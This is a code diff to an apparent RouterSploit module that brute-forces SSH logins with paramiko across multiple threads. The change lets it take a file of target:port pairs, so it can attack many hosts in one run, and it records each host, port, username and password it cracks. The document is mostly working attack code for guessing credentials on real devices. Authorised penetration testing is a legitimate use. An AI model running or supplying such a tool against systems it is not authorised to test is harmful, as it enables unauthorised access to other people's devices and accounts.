@@ -12,6 +12,7 @@ from routersploit import (
     print_success,
     print_table,
     boolify,
+    multi,
 )
 
 
@@ -25,7 +26,7 @@ class Exploit(exploits.Exploit):
         'author': 'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
     }
 
-    target = exploits.Option('', 'Target IP address')
+    target = exploits.Option('', 'Target IP address or file with target:port (file://)')
     port = exploits.Option(22, 'Target port')
 
     threads = exploits.Option(8, 'Number of threads')
@@ -37,6 +38,10 @@ class Exploit(exploits.Exploit):
 
     def run(self):
         self.credentials = []
+        self.attack()
+
+    @multi        
+    def attack(self):
         ssh = paramiko.SSHClient()
 
         try:
@@ -65,7 +70,7 @@ class Exploit(exploits.Exploit):
 
         if len(self.credentials):
             print_success("Credentials found!")
-            headers = ("Login", "Password")
+            headers = ("Target", "Port", "Login", "Password")
             print_table(headers, *self.credentials)
         else:
             print_error("Credentials not found")
@@ -88,12 +93,12 @@ class Exploit(exploits.Exploit):
                 break
             except paramiko.ssh_exception.SSHException as err:
                 ssh.close()
-                print_error(name, err, "Username: '{}' Password: '{}'".format(user, password), verbose=module_verbosity)
+                print_error("Target: {}:{} {}: {} Username: '{}' Password: '{}'".format(self.target, self.port, name, err, user, password), verbose=module_verbosity)
             else:
                 running.clear()
 
-                print_success("{}: Authentication succeed!".format(name), user, password, verbose=module_verbosity)
+                print_success("Target: {}:{} {} Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
 
-                self.credentials.append((user, password))
+                self.credentials.append((self.target, self.port, user, password))
 
         print_status(name, 'thread is terminated.', verbose=module_verbosity)
